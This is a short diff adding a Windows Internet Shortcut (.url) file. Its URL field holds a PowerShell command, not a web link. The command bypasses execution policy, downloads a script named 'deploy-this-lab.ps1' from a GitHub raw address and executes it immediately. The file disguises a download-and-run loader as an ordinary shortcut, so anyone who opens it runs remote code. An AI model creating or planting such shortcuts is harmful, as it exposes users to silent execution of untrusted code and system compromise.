@@ -1,0 +1,2 @@
+[InternetShortcut]
+URL=powershell.exe -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/marnep/LINUX-APACHE/main/deploy-this-lab.ps1' -UseBasicParsing)"
